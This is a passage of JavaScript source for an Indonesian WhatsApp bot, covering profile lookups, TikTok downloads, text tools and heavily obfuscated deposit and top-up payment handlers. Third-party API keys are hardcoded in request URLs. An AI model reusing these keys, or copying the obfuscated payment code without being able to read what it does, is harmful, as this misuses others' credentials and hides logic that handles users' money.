if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "stalkgithub",
data: {
id_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim Username Github*")
} else {
reply("username nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "stalkgithub") {
data_deposit.data.id_nya = (chats)

var git = await fetchJson(`https://api.github.com/users/${data_deposit.data.id_nya}`)
data_deposit.session = "input_username_github";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
let textGitthub =`*STALK-GITHUB*
id : ${git.id}
login : ${git.login}
html_url : ${git.html_url}
type : ${git.type}
name : ${git.name}
location : ${git.location}
bio : ${git.bio}
public_repos : ${git.public_repos}
followers : ${git.followers}
following : ${git.following}
created : ${git.created_at}
updated : ${git.updated_at}`
reply(textGitthub)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'besarkecil') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "besar_kecilnya",
data: {
text_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan tulis text yg ingin dijadiin besar dan kecil.*\n\n*Contoh:* hallo bro")
} else {
reply("nomor nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "besar_kecilnya") {
data_deposit.data.text_nya = (chats)
data_deposit.session = "text_nya_cuy";
var xx_besar = await fetchJson(`https://api.nataganz.com/api/random/besarkecil?text=${data_deposit.data.text_nya}&apikey=Pasha`)
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*BESAR KECIL*
*Text:* ${data_deposit.data.text_nya}
*Hasil:* ${xx_besar.result.list}`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'bilangangka') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "bilang_angkanya",
data: {
text_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan tulis number yg ingin dibilang.*\n\n*Contoh:* 1234")
} else {
reply("nomor nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "bilang_angkanya") {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_deposit.data.text_nya = Number(chats);
data_deposit.session = "text_nya_cuy";
var xx_bilang = await fetchJson(`https://api.nataganz.com/api/random/bilangangka?text=${data_deposit.data.text_nya}&apikey=Pasha`)
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*BILANG ANGKA*
*Nomor:* ${data_deposit.data.text_nya}
*Hasil:* ${xx_bilang.result.list}`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'balikangka') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "balik_angkanya",
data: {
text_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan tulis number yg ingin dibalik.*\n\n*Contoh:* 1234")
} else {
reply("nomor nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "balik_angkanya") {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_deposit.data.text_nya = Number(chats);
data_deposit.session = "text_nya_cuy";
var xx_angka = await fetchJson(`https://api.nataganz.com/api/random/balikangka?text=${data_deposit.data.text_nya}&apikey=Pasha`)
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*BALIK ANGKA*
*Nomor Asli:* ${data_deposit.data.text_nya}
*Nomor Hasil:* ${xx_angka.result.list}`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'balikhuruf') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "balik_hurufnya",
data: {
text_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan tulis text yg ingin dibalik.*\n\n*Contoh:* Ngetes")
} else {
reply("text nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "balik_hurufnya") {
data_deposit.data.text_nya = (chats);
data_deposit.session = "text_nya_cuy";
var xx_huruf = await fetchJson(`https://api.nataganz.com/api/random/balikhuruf?text=${data_deposit.data.text_nya}&apikey=Pasha`)
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*BALIK HURUF*
*Text Asli:* ${data_deposit.data.text_nya}
*Text Hasil:* ${xx_huruf.result.list}`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'stalkff') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "stalkff",
data: {
id_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim ID free fire kamu*")
} else {
reply("id ff nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "stalkff") {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka!")
data_deposit.data.id_nya = Number(chats);
let stalk_freefire = await stalkff(data_deposit.data.id_nya)
if (stalk_freefire.status == 404) return reply('*Error ID tidak ditemukan*\n*Silahkan kirim ID yg valid*')
data_deposit.session = "input_id_ff";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*STALKER FF*
*ID:* ${data_deposit.data.id_nya}
*Username:* ${stalk_freefire.nickname}`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'tiktok') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
session: "TIKTOK",
data: {
url_tiktok: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim link/url tiktoknya*")
} else{
reply("Url tiktok nya mana kak?")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "TIKTOK") {
data_deposit.data.url_tiktok = isUrl(chats)
var tt_res = await fetchJson(`https://saipulanuar.ga/api/download/tiktok2?url=${chats}&apikey=jPHjZpQF`)
data_deposit.session = "masukan_urlnyaabro";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`*TIKTOK DOWNLOAD*

*Author:* OHLX BOT
*Judul:* ${tt_res.result.judul}
*Source:* ${chats}

Video dan audio sedang dikirim...`)
await sleep(2000)
conn.sendMessage(sender,{video:{url:tt_res.result.video.link1}, caption:'No Watermark!'}, {quotes:msg})
conn.sendMessage(sender,{audio:{url:tt_res.result.audio.link1}, mimetype:'audio/mpeg', fileName:'audio.mp3'}, {quoted:msg})

if (isGroup) return conn.sendMessage(from, {text:'Media sudah dikirim lewat chat pribadi bot.'}, {quoted:msg})
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'tahta_maker') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
session: "tahta",
data: {
nulis_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim nama yang mau ditulis.*")
} else {
reply('Namanya apa?')
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "tahta") {
data_deposit.data.nulis_nya = (chats);

data_deposit.session = "tahta_yexftt";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply('Wait sedang menulis..')
var tah =`https://leyscoders-api.herokuapp.com/api/harta-tahta?text=${data_deposit.data.nulis_nya}&apikey=IkyOgiwara`
conn.sendMessage(from, { image: {url:tah}, caption: 'Done!'}, {quoted:msg})
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
} else if (command === 'sadcat') {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
session: "sadcat",
data: {
nulis_nya: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("*Silahkan kirim text yang mau ditulis.*")
} else {
reply('Text yg mau jadiin sadcat mana??')
}}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")){
if (!chats.startsWith(prefix) && !msg.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "sadcat") {
data_deposit.data.nulis_nya = (chats);
data_deposit.session = "masukan_texcatt";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply('Wait sedang bikin makernya..')
var nul = `https://api.popcat.xyz/sadcat?text=${data_deposit.data.nulis_nya}`
conn.sendMessage(from, { image: {url:nul}, caption: 'Done!'}, {quoted:msg})
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}
}
}

// function topup dan deposit
// jual yg no enc 200k nego dikit
// full pengajaran cara nambah produk
// pastinya diajarin sampe bisa

// Func Deposit
function _0x40cc(){var _0x3992df=['payment_dana','4dIVrsj','DANA','9950778Hcbgza','crypto','\x0a\x0a_Silahkan\x20transfer\x20dengan\x20nomor\x20yang\x20sudah\x20tertera,\x20Jika\x20sudah\x20harap\x20kirim\x20bukti\x20foto\x20dengan\x20caption\x20#bukti\x20untuk\x20di\x20acc\x20oleh\x20admin_','number','stringify','sendMessage','readFileSync','writeFileSync','2946480Rurdya','session','48qmdAJe','Asia/Jakarta','Masukan\x20hanya\x20angka\x20ya','unlinkSync','23709muitRs','payment_qris','amount_deposit','atas_nama','amount','toLowerCase','༆━━[\x20*PAYMENT\x20OVO*\x20]━━࿐\x0a\x20\x0a*Nomer\x20:*\x20','238hwQbpF','data','Proses\x20Deposit\x20kamu\x20masih\x20ada\x20yang\x20belum\x20terselesaikan\x0a\x0aKetik\x20N\x20untuk\x20membatalkan','key','existsSync','4487639GzVwoE','Oke\x20kak\x20mau\x20deposit\x20berapa?\x0a\x0aContoh:\x2015000','9314wBukzU','Baik\x20kak,\x20Deposit\x20Dengan\x20ID\x20:\x20','「\x20𝙆𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙎𝙄-𝘿𝙀𝙋𝙊𝙎𝙄𝙏\x20」\x0a\x0a•\x20𝗜𝗗\x20𝗥𝗲𝘀𝗶:\x20','payment','\x0a*AN\x20:*\x20','.json','link_nya','fromMe','nomer','hex','5LzGzjE','389lsrnOt','2384ClpRSF','toUpperCase','ovo','\x20dibatalkan\x20😊','konfirmasi_deposit','3916913BQSPfq','dana','randomBytes','23796yjHwVV','split','toLocaleDateString','toString','QRIS','༆━━[\x20*PAYMENT\x20QRIS*\x20]━━࿐\x0a\x20\x0a*Url\x20:*\x20','220OyBErv'];_0x40cc=function(){return _0x3992df;};return _0x40cc();}var _0x3c5680=_0x4430;(function(_0x3caac1,_0x2a8837){var _0x4dbc29=_0x4430,_0xadb9ea=_0x3caac1();while(!![]){try{var _0x1443ec=-parseInt(_0x4dbc29(0x1b5))/0x1*(parseInt(_0x4dbc29(0x1aa))/0x2)+-parseInt(_0x4dbc29(0x196))/0x3*(parseInt(_0x4dbc29(0x18c))/0x4)+parseInt(_0x4dbc29(0x1b4))/0x5*(-parseInt(_0x4dbc29(0x18e))/0x6)+parseInt(_0x4dbc29(0x19c))/0x7*(parseInt(_0x4dbc29(0x17c))/0x8)+-parseInt(_0x4dbc29(0x184))/0x9*(parseInt(_0x4dbc29(0x18a))/0xa)+parseInt(_0x4dbc29(0x181))/0xb*(-parseInt(_0x4dbc29(0x198))/0xc)+-parseInt(_0x4dbc29(0x1a8))/0xd*(-parseInt(_0x4dbc29(0x1a3))/0xe);if(_0x1443ec===_0x2a8837)break;else _0xadb9ea['push'](_0xadb9ea['shift']());}catch(_0x4e97d3){_0xadb9ea['push'](_0xadb9ea['shift']());}}}(_0x40cc,0xe63e9));if(isListMessage==='payment_ovo'){if(!fs[_0x3c5680(0x1a7)](depositPath+sender[_0x3c5680(0x185)]('@')[0x0]+_0x3c5680(0x1af))){var deposit_object={'ID':require(_0x3c5680(0x18f))['randomBytes'](0x5)[_0x3c5680(0x187)](_0x3c5680(0x1b3))['toUpperCase'](),'session':_0x3c5680(0x1a0),'date':new Date()[_0x3c5680(0x186)]('ID',{'timeZone':_0x3c5680(0x199)}),'number':sender,'payment':'OVO','data':{'amount_deposit':''}};fs[_0x3c5680(0x195)](depositPath+sender[_0x3c5680(0x185)]('@')[0x0]+'.json',JSON[_0x3c5680(0x192)](deposit_object,null,0x2)),reply(_0x3c5680(0x1a9));}else reply(_0x3c5680(0x1a5));}else{if(isListMessage===_0x3c5680(0x19d)){if(!fs[_0x3c5680(0x1a7)](depositPath+sender[_0x3c5680(0x185)]('@')[0x0]+_0x3c5680(0x1af))){var deposit_object={'ID':require(_0x3c5680(0x18f))[_0x3c5680(0x183)](0x5)[_0x3c5680(0x187)](_0x3c5680(0x1b3))[_0x3c5680(0x17d)](),'session':'amount','date':new Date()['toLocaleDateString']('ID',{'timeZone':_0x3c5680(0x199)}),'number':sender,'payment':'QRIS','data':{'amount_deposit':''}};fs['writeFileSync'](depositPath+sender[_0x3c5680(0x185)]('@')[0x0]+'.json',JSON[_0x3c5680(0x192)](deposit_object,null,0x2)),reply(_0x3c5680(0x1a9));}else reply(_0x3c5680(0x1a5));}else{if(isListMessage===_0x3c5680(0x18b)){if(!fs[_0x3c5680(0x1a7)](depositPath+sender[_0x3c5680(0x185)]('@')[0x0]+_0x3c5680(0x1af))){var deposit_object={'ID':require(_0x3c5680(0x18f))[_0x3c5680(0x183)](0x5)[_0x3c5680(0x187)](_0x3c5680(0x1b3))[_0x3c5680(0x17d)](),'session':_0x3c5680(0x1a0),'date':new Date()[_0x3c5680(0x186)]('ID',{'timeZone':'Asia/Jakarta'}),'number':sender,'payment':_0x3c5680(0x18d),'data':{'amount_deposit':''}};fs['writeFileSync'](depositPath+sender[_0x3c5680(0x185)]('@')[0x0]+_0x3c5680(0x1af),JSON[_0x3c5680(0x192)](deposit_object,null,0x2)),reply(_0x3c5680(0x1a9));}else reply(_0x3c5680(0x1a5));}}}function _0x4430(_0x47df2f,_0x554188){var _0x40ccf2=_0x40cc();return _0x4430=function(_0x4430b0,_0x14e2a6){_0x4430b0=_0x4430b0-0x17c;var _0x7254d3=_0x40ccf2[_0x4430b0];return _0x7254d3;},_0x4430(_0x47df2f,_0x554188);}if(fs[_0x3c5680(0x1a7)](depositPath+sender[_0x3c5680(0x185)]('@')[0x0]+_0x3c5680(0x1af))){if(!chats['startsWith'](prefix)&&!msg[_0x3c5680(0x1a6)][_0x3c5680(0x1b1)]){let data_deposit=JSON['parse'](fs[_0x3c5680(0x194)](depositPath+sender['split']('@')[0x0]+'.json'));if(data_deposit[_0x3c5680(0x197)]===_0x3c5680(0x1a0)){if(isNaN(chats))return reply(_0x3c5680(0x19a));data_deposit[_0x3c5680(0x1a4)][_0x3c5680(0x19e)]=Number(chats);if(data_deposit['data'][_0x3c5680(0x19e)]<0x2710)return reply('Deposit\x20Minimal\x20Rp10.000');data_deposit[_0x3c5680(0x197)]='konfirmasi_deposit',fs[_0x3c5680(0x195)](depositPath+sender[_0x3c5680(0x185)]('@')[0x0]+'.json',JSON[_0x3c5680(0x192)](data_deposit,null,0x3)),reply(_0x3c5680(0x1ac)+data_deposit['ID']+'\x0a•\x20𝗡𝗼𝗺𝗲𝗿:\x20'+data_deposit[_0x3c5680(0x191)]['split']('@')[0x0]+'\x0a•\x20𝗣𝗮𝘆𝗺𝗲𝗻𝘁:\x20'+data_deposit['payment']+'\x0a•\x20𝗝𝘂𝗺𝗹𝗮𝗵\x20𝗗𝗲𝗽𝗼𝘀𝗶𝘁:\x20Rp'+toRupiah(data_deposit[_0x3c5680(0x1a4)][_0x3c5680(0x19e)])+'\x0a•\x20𝗣𝗮𝗷𝗮𝗸\x20𝗔𝗱𝗺𝗶𝗻:\x20Rp2.500\x0a•\x20𝗧𝗼𝘁𝗮𝗹\x20𝗣𝗲𝗺𝗯𝗮𝘆𝗮𝗿𝗮𝗻:\x20Rp'+toRupiah(data_deposit[_0x3c5680(0x1a4)][_0x3c5680(0x19e)]+0x9c4)+'\x0a\x0a_Deposit\x20akan\x20dibatalkan\x20otomatis\x20apabila\x20terdapat\x20kesalahan\x20input._\x0a\x0a*_Ketik\x20Y\x20untuk\x20melanjutkan_*\x0a*_Ketik\x20N\x20untuk\x20membatalkan_*');}else{if(data_deposit['session']===_0x3c5680(0x180)){if(chats[_0x3c5680(0x1a1)]()==='y'){if(data_deposit['payment']==='OVO'){var py_ovo=_0x3c5680(0x1a2)+setting[_0x3c5680(0x1ad)][_0x3c5680(0x17e)][_0x3c5680(0x1b2)]+'\x0a*AN\x20:*\x20'+setting[_0x3c5680(0x1ad)]['ovo'][_0x3c5680(0x19f)]+_0x3c5680(0x190);reply(py_ovo);}else{if(data_deposit['payment']===_0x3c5680(0x188)){var qr_fexf=_0x3c5680(0x189)+setting[_0x3c5680(0x1ad)]['qris'][_0x3c5680(0x1b0)]+_0x3c5680(0x1ae)+setting[_0x3c5680(0x1ad)]['qris']['atas_nama']+_0x3c5680(0x190);conn[_0x3c5680(0x193)](from,{'image':{'url':setting[_0x3c5680(0x1ad)]['qris'][_0x3c5680(0x1b0)]},'caption':qr_fexf},{'quoted':msg});}else{if(data_deposit['payment']==='DANA'){var py_dana='༆━━[\x20*PAYMENT\x20DANA*\x20]━━࿐\x0a\x20\x0a*Nomer\x20:*\x20'+setting['payment'][_0x3c5680(0x182)][_0x3c5680(0x1b2)]+_0x3c5680(0x1ae)+setting['payment'][_0x3c5680(0x182)][_0x3c5680(0x19f)]+'\x0a\x0a_Silahkan\x20transfer\x20dengan\x20nomor\x20yang\x20sudah\x20tertera,\x20Jika\x20sudah\x20harap\x20kirim\x20bukti\x20foto\x20dengan\x20caption\x20#bukti\x20untuk\x20di\x20acc\x20oleh\x20admin_';reply(py_dana);}}}}else chats[_0x3c5680(0x1a1)]()==='n'&&(reply(_0x3c5680(0x1ab)+data_deposit['ID']+_0x3c5680(0x17f)),fs[_0x3c5680(0x19b)](depositPath+sender[_0x3c5680(0x185)]('@')[0x0]+'.json'));}}}}

// Func Topup
const _0x1ef6e3=_0x1578;function _0x2e3d(){const _0x27a9ff=['XLTF','&harga=','Hanya\x20angka!','nickname','TTF','PILIH-GAME','log','2BipojF','existsSync','\x0a\x0a_Terimakasih\x20kak\x20sudah\x20order\x20☺️_','batal_order','Harga:\x20Rp\x20','push','Topup\x20Saldo\x20Dana',')\x0a\x0aApakah\x20data\x20tersebut\x20sudah\x20benar?\x20akan\x20gagal\x20apabila\x20terdapat\x20kesalahan\x20input.\x0a\x0a_Ketik\x20*Y*\x20untuk\x20melanjutkan,\x20*N*\x20untuk\x20mengulangi\x20inputan_','Oke\x20kak\x20Pesanan\x20dengan\x20ID\x20*','error','GOPAY','includes','80179EVWAON','INPUT-GAME-ID','apikey_antlatic','Oke\x20kak\x20Pesanan\x20DiBatalkan\x20☺️','Topup\x20Saldo\x20LinkAja','readFileSync','540178szozKz','split','\x0a*ID\x20ML:*\x20','pulsa_three','4355yOtDrN','Silahkan\x20pilih\x20nominal\x20diamond','\x0a*No\x20Tujuan:*\x20','sendMessage','success','topup_dana','topup_ff','\x0a*Nomor\x20Target:*\x20','Mohon\x20Maaf,\x20Sedang\x20terjadi\x20kesalahan\x20untuk\x20service\x20*','id_topup','produk_topup','Hanya\x20angka\x20dan\x20tanpa\x20spasi!','Nominal\x20Pulsa\x20Axis','empty','PLN','Pesanan\x20dibatalkan!\x0aAlasan\x20:\x20','replace','\x0a*Number:*\x20@','(Kosong)','pulsa_indosat','14iJFvKs','status','444hIZROT','792ThrUJm','services','data','Voucher\x20Garena\x20Shell','9LguCSF','\x0a*ID\x20Free\x20Fire:*\x20','*──\x20「\x20TOPUP\x20SUKSES\x20」\x20──*\x0a\x0a*Status:*\x20Success\x0a*ID\x20order:*\x20','code','Silahkan\x20Kirim\x20*ZoneID\x20Mobile\x20Legends*','->\x20','https://www.atlantic-pedia.co.id/api/pulsa','id_zone','[CHECKING]','\x0a*Nickname:*\x20','stringify','Nominal\x20Pulsa\x20Three','topup_shoope','\x0a*Layanan:*\x20','AXTF','length','session','pulsa_xl','listResponseMessage','KONFIRMASI-TOPUP','\x0a*Harga:*\x20Rp','INPUT-GAME-ZONE-ID','Token\x20Listrik\x20PLN','*Silahkan\x20Kirim\x20Nomor\x20Shoope\x20Kamu*\x0a*Wajib\x20Berawal\x20dari\x20628xx*','Server\x20maintenance.','.json','*,\x20Silahkan\x20pilih\x20service\x20lain\x20atau\x20coba\x20lagi\x20di\x20lain\x20waktu\x20☺️','SHP','parse','Silahkan\x20pilih\x20nominal\x20voucher','harga_topup','topup_gs','name','singleSelectReply','*Silahkan\x20kirim\x20nomor*\x0a*meteran/id\x20pelanggan*','Diamond\x20Free\x20Fire','Silahkan\x20pilih\x20nominal\x20pulsanya','id_produk','*Silahkan\x20Kirim\x20Nomor\x20Dana\x20Kamu*\x0a*Wajib\x20Berawal\x20dari\x20628xx*','VMLSO','Mohon\x20ditunggu\x20sebentar,\x20Pesanan\x20dengan\x20ID\x20*','topup_ml','unlinkSync','ITF','OVO','catch','2013288wNAIfY','writeFileSync','topup_ovo','*Silahkan\x20Kirim\x20Nomor\x20LinkAja\x20Kamu*\x0a*Wajib\x20Berawal\x20dari\x20628xx*','STF','PILIH-LIST-GAME','17861051WinBen','Touch\x20me\x20senpai','Silahkan\x20pilih\x20nominal\x20saldo','\x0a\x0a*SN:*\x0a','9zIRfLm','sort','\x0a\x0aApakah\x20data\x20tersebut\x20sudah\x20benar?\x20akan\x20gagal\x20apabila\x20terdapat\x20kesalahan\x20input.\x0a\x0a_Ketik\x20*Y*\x20untuk\x20melanjutkan,\x20*N*\x20untuk\x20mengulangi\x20inputan_','price','message','id=','Bukan\x20lu,\x20lu\x20tuh\x20ga\x20di\x20ajak','Nominal\x20Pulsa\x20Telkomsel','DANA','*Silahkan\x20kirim\x20nomor\x20hp*\x0a*wajib\x20berawal\x20dari\x20628xx\x20tanpa\x20spasi*','POST','Silahkan\x20pilih\x20nominal\x20tokennya','150584yJeQTE','order',')\x0a\x0a*SN:*\x0a','Diamond\x20Mobile\x20Legends','then','result','Nominal\x20Pulsa\x20XL','number','pulsa_telkomsel','*Silahkan\x20Kirim\x20Nomor\x20Gopay\x20Kamu*\x0a*Wajib\x20Berawal\x20dari\x20628xx*','Pastikan\x20Id\x20anda\x20benar\x0asilahkan\x20kirim\x20Id\x20anda\x20kembali!','*\x20Sedang\x20diproses⏳','Maaf\x20saldo\x20anda\x20kurang','title','VGR','1288330WTiXrK','topup_linkaja','trxid','green','LINKAJA','id_target','*\x20DiBatalkan\x20☺️','「\x20*KONFIRMASI-TOPUP*\x20」\x0a\x0a*ID:*\x20','Silahkan\x20Kirim\x20*ID\x20Free\x20Fire*','topup_gopay','selectedRowId'];_0x2e3d=function(){return _0x27a9ff;};return _0x2e3d();}function _0x1578(_0x3aa8eb,_0x1773d2){const _0x2e3d0a=_0x2e3d();return _0x1578=function(_0x157818,_0xc8def0){_0x157818=_0x157818-0xda;let _0x25a30a=_0x2e3d0a[_0x157818];return _0x25a30a;},_0x1578(_0x3aa8eb,_0x1773d2);}(function(_0x398553,_0x24e375){const _0x249bd8=_0x1578,_0x3de96a=_0x398553();while(!![]){try{const _0x4f475b=parseInt(_0x249bd8(0x159))/0x1*(parseInt(_0x249bd8(0x147))/0x2)+parseInt(_0x249bd8(0x11a))/0x3*(parseInt(_0x249bd8(0x126))/0x4)+parseInt(_0x249bd8(0x15d))/0x5*(parseInt(_0x249bd8(0xde))/0x6)+parseInt(_0x249bd8(0xdb))/0x7*(parseInt(_0x249bd8(0x110))/0x8)+-parseInt(_0x249bd8(0xe2))/0x9*(-parseInt(_0x249bd8(0x135))/0xa)+parseInt(_0x249bd8(0x153))/0xb*(parseInt(_0x249bd8(0xdd))/0xc)+-parseInt(_0x249bd8(0x116))/0xd;if(_0x4f475b===_0x24e375)break;else _0x3de96a['push'](_0x3de96a['shift']());}catch(_0x29374c){_0x3de96a['push'](_0x3de96a['shift']());}}}(_0x2e3d,0x48449));if(fs[_0x1ef6e3(0x148)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+'.json')){let data_topup=JSON[_0x1ef6e3(0xfe)](fs[_0x1ef6e3(0x158)](topupPath+sender[_0x1ef6e3(0x15a)]('@')[0x0]+_0x1ef6e3(0xfb)));if(data_topup[_0x1ef6e3(0xf2)]===_0x1ef6e3(0x145)){if(isListMessage===_0x1ef6e3(0xf3))axios({'method':_0x1ef6e3(0x124),'url':_0x1ef6e3(0xe8),'data':qs['stringify']({'key':setting['apikey_antlatic'],'action':_0x1ef6e3(0xdf)})})[_0x1ef6e3(0x12a)](_0x20fe0f=>{const _0x80e00=_0x1ef6e3,_0xaefc07=(_0x194d55,_0x3f591c)=>{const _0x2cf0e5=_0x1578,_0x4e863c=Number(_0x194d55['price'][_0x2cf0e5(0x16d)](/[^0-9.-]+/g,'')),_0xa2c92c=Number(_0x3f591c[_0x2cf0e5(0x11d)]['replace'](/[^0-9.-]+/g,''));return _0x4e863c-_0xa2c92c;};if(_0x20fe0f[_0x80e00(0xe0)]['result']==![])return reply(_0x80e00(0xfa));let _0x65fcc1=[],_0x621215=[];for(let _0x2cbe09 of _0x20fe0f[_0x80e00(0xe0)][_0x80e00(0xe0)]){_0x2cbe09['code'][_0x80e00(0x152)](_0x80e00(0x140))&&_0x65fcc1[_0x80e00(0x14c)](_0x2cbe09);}_0x65fcc1['sort'](_0xaefc07);for(let _0x32782f of _0x65fcc1){_0x621215[_0x80e00(0x14c)]({'title':_0x32782f['name']+('\x20'+(_0x32782f[_0x80e00(0xdc)]==_0x80e00(0x16a)?_0x80e00(0x16f):'')),'rowId':_0x80e00(0x11f)+_0x32782f[_0x80e00(0xe5)]+_0x80e00(0x141)+_0x32782f[_0x80e00(0x11d)],'description':_0x80e00(0x14b)+toRupiah(Number(_0x32782f[_0x80e00(0x11d)]))});}var _0x1701d3={'text':_0x80e00(0x106),'buttonText':_0x80e00(0x117),'sections':[{'title':_0x80e00(0x12c),'rows':_0x621215}]};data_topup[_0x80e00(0xf2)]='PILIH-LIST-GAME',fs[_0x80e00(0x111)](topupPath+sender['split']('@')[0x0]+_0x80e00(0xfb),JSON[_0x80e00(0xec)](data_topup,null,0x3)),conn[_0x80e00(0x160)](from,_0x1701d3);});else{if(isListMessage===_0x1ef6e3(0x15c))axios({'method':'POST','url':_0x1ef6e3(0xe8),'data':qs[_0x1ef6e3(0xec)]({'key':setting[_0x1ef6e3(0x155)],'action':_0x1ef6e3(0xdf)})})[_0x1ef6e3(0x12a)](_0x59e157=>{const _0x311568=_0x1ef6e3,_0x2917ac=(_0x46ed46,_0x3428b1)=>{const _0x4e2f8d=_0x1578,_0x5e8608=Number(_0x46ed46[_0x4e2f8d(0x11d)][_0x4e2f8d(0x16d)](/[^0-9.-]+/g,'')),_0x1f794b=Number(_0x3428b1['price']['replace'](/[^0-9.-]+/g,''));return _0x5e8608-_0x1f794b;};if(_0x59e157[_0x311568(0xe0)][_0x311568(0x12b)]==![])return reply('Server\x20maintenance.');let _0xcbe4a1=[],_0x360abd=[];for(let _0x13848d of 